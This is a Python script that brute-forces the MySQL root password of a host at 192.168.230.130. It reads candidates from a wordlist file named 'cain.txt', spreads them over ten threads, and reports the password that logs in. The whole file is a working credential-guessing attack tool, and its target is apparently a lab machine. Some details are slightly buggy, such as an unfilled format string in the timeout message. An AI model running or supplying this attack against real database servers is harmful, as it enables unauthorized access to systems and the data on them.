import mysql.connector
import numpy as np
import concurrent.futures
import traceback
import threading

NO_THREADS = 10


def try_connection(potential_array):
    for val in potential_array:
        val = val.rstrip()
        print("[{}] Try with val: {}".format(threading.current_thread().native_id, val))
        try:
            connector = mysql.connector.connect(user="root", database="information_schema", host="192.168.230.130",
                                                password=val)
            connector.close()
            print(
                "[{}]: successfully connected with user root and pass: {}".format(threading.current_thread().native_id,
                                                                                  val))
            # TODO: send SIGTERM to others threads.
            return val
        except BaseException as exc:
            if exc.errno == 1045:
                # Access denied
                continue
            if exc.errno == 2055:
                print("[{}]: lost connection with server; timed out")
                # TODO: try with this value later.
    return -1


def main():
    print("Searching for pass")
    # TODO: pass the file as an argument
    passwordsFile = open("cain.txt", "r")

    line = passwordsFile.readline()
    s = 0
    arrayOfLists = []
    for i in range(NO_THREADS):
        arrayOfLists.append([])

    while line:
        arrayOfLists[(s % NO_THREADS)].append(line)
        line = passwordsFile.readline()
        s = s + 1

    print("Numbers of lists: {}".format(len(arrayOfLists)))
    with concurrent.futures.ThreadPoolExecutor() as executor:
        executor.map(try_connection, arrayOfLists)


if __name__ == '__main__':
    main()
